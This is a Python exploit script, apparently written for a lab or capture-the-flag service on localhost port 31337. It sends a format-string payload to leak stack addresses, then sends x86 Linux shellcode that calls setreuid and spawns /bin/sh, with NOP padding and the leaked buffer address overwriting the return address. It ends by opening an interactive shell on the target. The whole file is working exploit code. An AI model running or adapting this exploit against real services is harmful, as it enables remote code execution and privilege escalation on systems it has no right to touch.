import socket
import struct
from telnetlib import Telnet

shellcode = "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"
shellcode += "\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68"
shellcode += "\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
#shellcode = "\xCC"*8
remote_addr = "127.0.0.1"
remote_port = 31337

EXPLOIT_BUFFER_ADDR_INDEX = 7

def sendline(sock, msg):
	sock.send(msg+b"\n")
def recvuntil_c(sock, character):
	out = b''
	current = b''
	while current != character:
		current = sock.recv(1)
		if current != character:
			out += current
	return out
def recvline(sock):
	return recvuntil_c(sock, b"\n")
def print_recieved(recieved):
	print("[*] Recieved : "+str(recieved))
def print_addr_array(arr):
	i = 0
	for elem in arr:
		print(str(i) + " : " +hex(elem))
		i += 1
def padding(p, buffer_size):
	off = buffer_size - len(p)
	ret = p
	ret += "\x90"*off
	return ret
def str_arr2int_arr(arr):
	out = []
	for elem in arr:
			try:
				out.append(int(elem, 16))
			except Exception:
				out.append(-1)
				pass
	return out

def user_interactive(sock):
	try:
		t = Telnet()
		t.sock = sock
		t.interact()
		sock.close()
	except Exception as e:
		sock.close()
def exploit(sock, shellcode):
	try:
		resp = sock.recv(1024)
		print_recieved(resp)

		payload = bytearray()
		payload += b"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p"
		payload += " "
		payload = padding(payload, 64)
		sendline(sock, payload)

		resp = recvline(sock)
		print_recieved(resp)

		leaks = resp.split(" ")
		del leaks[0]
		del leaks[-1]
		stack_addresses = str_arr2int_arr(leaks)

		print_addr_array(stack_addresses)

		buffer_addr = stack_addresses[EXPLOIT_BUFFER_ADDR_INDEX]
		print("[*] Buffer address : "+hex(buffer_addr))

		resp = sock.recv(1024)
		print_recieved(resp)

		payload = padding(shellcode, 64)
		payload += "A"*8
		payload += "B"*4
		payload += struct.pack("I", buffer_addr)

		sendline(sock, payload)

		user_interactive(sock)

		sock.close()
	except Exception as e:
		print("Error : "+str(e))
		sock.close()

sock = socket.socket()
sock.connect((remote_addr, remote_port))

raw_input("Start exploit ?")

exploit(sock, shellcode)